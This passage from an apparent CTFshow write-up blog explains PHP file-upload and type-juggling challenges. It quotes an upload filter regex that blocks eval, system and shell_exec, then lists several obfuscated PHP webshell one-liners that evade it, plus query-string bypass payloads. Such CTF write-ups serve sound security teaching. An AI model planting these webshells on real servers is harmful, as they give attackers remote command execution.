operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"文件超过1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>本来还想着包含一波日志。</p><p><strong>字符拼接</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token operator">.</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>$_REQUEST</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>数学函数</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>acos<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># get传参   abs=system&amp;acos=ls</span></span></code></pre><p><a href="https://yanmie-art.github.io/2020/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6web%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">这里</a></p><p><strong>其他函数构造</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h4><p>日志包含</p><p>不过index.php需要自己上传</p><h4 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h4><p>同169</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-php</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-php/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-php/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-数组绕过"><a href="#web89-数组绕过" class="headerlink" title="web89(数组绕过)"></a>web89(数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>分析上面的代码可以看出，正则匹配0-9，匹配到则返回true，直接die，但是由于preg_match()只能处理字符串，当传入的是数组时将会返回false,从而绕过死亡函数。</p><p>**intval()<strong>函数用于获取变量的整数值。</strong>intval()**函数通过使用指定的进制 base 转换（默认是十进制），返回变量var的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。也就是说，当给intval()函数传入一个非空的数组时，intval()函数将会返回1，结合我们preg_match()传入数组返回false的特性，这道题的payload就很清楚了。</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)，其中var必填，base可选，这里base&#x3D;0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。</p><p>这里&#x3D;&#x3D;&#x3D;表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。</p><p>Paylod：</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() 还有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>…</p></blockquote><p>根据以下解释，可以传入一个数组来绕过不含数字而且intval取整数</p><p><a href="https://www.nssctf.cn/problem/2076">[NSSCTF 2022 Spring Recruit]babyphp</a></p><pre class="language-none"><code class="language-none">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1</code></pre><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p><p>考察了preg_match的&#x2F;m模式  </p><p>im模式是可以匹配很多行  i模式只能匹配一行</p><p>%0a换行，相当于enter</p><p>Payload：</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>和90很像不过第一个比较并不是强类型，所以不能使用简单的4476a或者4476.来绕过，其他都可以</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>过滤了所有字母但是可以使用8进制</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这段代码中的 if(!strpos($num, “0”)){} 行使用了 PHP 中的 strpos() 函数，它的作用是在字符串中查找特定子字符串第一次出现的位置。逐步解释这段代码的逻辑： 1.strpos($num, “0”)：这部分代码调用了 strpos() 函数，用于在 $num 变量中查找字符 “0” 第一次出现的位置。如果找到了，则返回该位置的索引值（索引值从0开始），如果没有找到，则返回 false。</p><p>所以开始不能有0，但是必须得有0，而且刚好第一个换成了强比较，所以可以使用4476.0</p><p>看其他wp是在前面加一个空格，也就是%20也可以使用%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>第一个改回去了，所以不能用4476.0其他Payload可以</p><h4 id="web96-绕过"><a href="#web96-绕过" class="headerlink" title="web96(.&#x2F;绕过)"></a>web96(.&#x2F;绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在Linux下.&#x2F;表示当前目录</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5数组绕过"><a href="#web97-md5数组绕过" class="headerlink" title="web97(md5数组绕过)"></a>web97(md5数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>这一道题涉及到了强比较的md5类型，从代码我们可以得知，要求a、b两个值不一样但是需要这两个值得md5值一样，因此强比较类型，我们可以利用md5函数处理数组类型会返回false的特性，从而利用false&#x3D;false来绕过。</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTF知识点： 关于PHP运算符&#x3D;&#x3D;&#x3D; 与&#x3D;&#x3D;的总结</a></p><h4 id="web98-三元运算符和传址-引用"><a href="#web98-三元运算符和传址-引用" class="headerlink" title="web98(三元运算符和传址(引用) )"></a>web98(三元运算符和传址(引用) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>看完一头雾水</p><p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解</a></p><p>考点是PHP里面的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址 我们可以修改一下代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>所以我们只需要 GET一个?1(因为GET传值调用了POST，所以无所谓) 加 POST一个HTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为数组</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向数组里面插入随机数</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token 